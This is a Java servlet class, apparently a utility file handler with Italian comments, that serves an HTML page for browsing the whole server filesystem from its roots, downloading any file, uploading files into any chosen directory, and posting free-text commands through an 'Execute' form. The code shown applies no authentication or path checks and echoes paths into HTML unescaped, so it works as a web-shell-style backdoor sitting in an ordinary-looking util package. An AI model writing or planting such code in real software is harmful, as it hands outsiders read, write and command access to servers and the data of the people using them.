package util.handler;

import java.io.File;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.sql.Timestamp;
import java.util.Arrays;
import java.util.Comparator;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.oreilly.servlet.MultipartRequest;

public class FileHandler {

	private static Comparator<File> SORT_FILE = new Comparator<File>() {
		@Override
		public int compare(File f1, File f2) {
			int res = f1.getName().compareTo( f2.getName() );
			return res;
		}
	};
	
	private static String fileAtts( File file ) {
		StringBuffer atts = new StringBuffer();
		if ( file.canRead() ) {
			atts.append( "r" );
		}
		if ( file.canWrite() ) {
			atts.append( "w" );
		}
		if ( file.canExecute() ) {
			atts.append( "x" );
		}
		if ( file.isHidden() ) {
			atts.append( "h" );
		}
		return atts.toString();
	}
	
	private static String fileLabel( File file ) throws IOException {
		StringBuffer label = new StringBuffer();
		if ( file.getParentFile() != null ) {
			label.append( file.getName() );
			if ( file.isDirectory() && file.getParentFile() != null ) {
				label.append( File.separator );
			}			
		} else {
			label.append( file.getCanonicalPath() );
		}
		return label.toString();
	}
	
	public static void handleFile( HttpServletRequest request, HttpServletResponse response, ServletContext context, int maxPostSize ) throws Exception {
		// percorso da processare
		String path = request.getParameter("path");

		if ( path == null) {
			try {
				System.out.println( "SAVE PATH  = "+context.getRealPath( "/" ) );
				MultipartRequest mr = new MultipartRequest( request , context.getRealPath( "/" ), maxPostSize );
				path = mr.getParameter( "path" );
				File file = mr.getFile( "fileData" );
				File newFile = new File( path, file.getName() );
				file.renameTo( newFile );	
			} catch (Exception e) {}
		}
		
		System.out.println( "PATH >>> "+path );
		
		// current file ed, eventualmente suo figli
		File currentFile = null;
		File[] listKids = null;
		
		// se il percorso non è impostato, allora parto dalle radici
        if( path == null ) {
        	listKids = File.listRoots();
        // se il percorso è impostato allora uso il parametro
        } else {
        	currentFile = new File( path );
        	if ( currentFile.isDirectory() ) {
        		listKids = currentFile.listFiles();
        	}
        }
			
		if ( listKids != null ) {
			PrintWriter pw = Util.startHtml(response);
			pw.println("<html>");
			pw.println("<body>");
			
			if ( currentFile != null ) {
				pw.println( "<p><form method='post' action='fs'>" );
				pw.println( "<input size='128' maxlength='512' type='text' name='path' value='"+currentFile.getCanonicalPath()+"'/>" );
				pw.println( "<input type='submit' name='cd' value='Change Dir'/>" );
				pw.println( "</form></p>" );

				pw.println( "<p><form method='post' action='fs' enctype='multipart/form-data'>" );
				pw.println( "<input type='hidden' name='path' value='"+currentFile.getCanonicalPath()+"'/>" );
				pw.println( "<input type='file' name='fileData'/>" );
				pw.println( "<input type='submit' name='cd' value='Upload'/> (maxsize:"+String.format("%,d%n", (Integer) maxPostSize )+")" );
				pw.println( "</form></p>" );
				
			}
			
			pw.println( "<p><form method='post' action='fs' target='execFrame'>" );
			pw.println( "<input type='hidden' name='action' value='exec'/>" );
			pw.println( "<input size='128' maxlength='512' type='text' name='exec' value=''/>" );
			pw.println( "<input type='submit' name='go' value='Execute'/>" );
			pw.println( "</form></p>" );
			

			
			if ( currentFile == null ) {
				pw.println( "<h3>No path provided, listing file system roots : </h3>" );
			} else {
				String back = null;
				if ( currentFile.getParentFile() != null ) {
					back = "<a href='fs?path="+currentFile.getParentFile().getCanonicalPath()+"'>(..)</a>" ;	
				} else {
					back = "<a href='fs'>(..)</a></p>" ;
				}
				pw.println( "<h3>Directory listing for : "+currentFile.getCanonicalPath()+" "+back+"</h3>" );
			}
			
			String tdSyle = " style='border: 1px solid black;' ";
			
			pw.println("<table style='width: 100%; border: 1px solid black;'>");
			pw.println("<tr>");
			pw.println("<th"+tdSyle+">Name</th>");
			pw.println("<th"+tdSyle+">Size</th>");
			pw.println("<th"+tdSyle+">Attributes</th>");
			pw.println("<th"+tdSyle+">Last modified</th>");
			pw.println("<th"+tdSyle+">Actions</th>");
			pw.println("</tr>");
			Arrays.sort( listKids, SORT_FILE );
			for (int k = 0; k < listKids.length; k++) {
				File current = listKids[k];
				pw.println("<tr>");
				pw.println("<td"+tdSyle+"><a href='fs?path="+current.getCanonicalPath()+"'>"+fileLabel( current )+"</a></td>");
				pw.println("<td"+tdSyle+" align='right'>"+current.length()+"</td>");
				pw.println("<td"+tdSyle+">"+fileAtts( current )+"</td>");
				pw.println("<td"+tdSyle+" align='right'>"+new Timestamp( current.lastModified() )+"</td>");
				pw.println("<td"+tdSyle+">&nbsp;" );
				pw.println("<a target='editFrame' href='fs?action=edit&path="+current.getCanonicalPath()+"'>Edit</a>" );
				pw.println("</td>" );
				pw.println("</tr>");
			}
			
			pw.println("</table>");
			pw.println("</body>");
			pw.println("</html>");
		} else {
			String contentDisposition = "attachment; filename="+currentFile.getName();
			response.addHeader("Content-Disposition", contentDisposition);
			byte buffer[] = new byte[1024];
			FileInputStream fis = new FileInputStream(currentFile);
			OutputStream os = response.getOutputStream();
			for ( int read = fis.read(buffer); read > 0; read = fis.read(buffer) ) {
				os.write( buffer, 0, read );
			}
			fis.close();
		}
	}
	
}
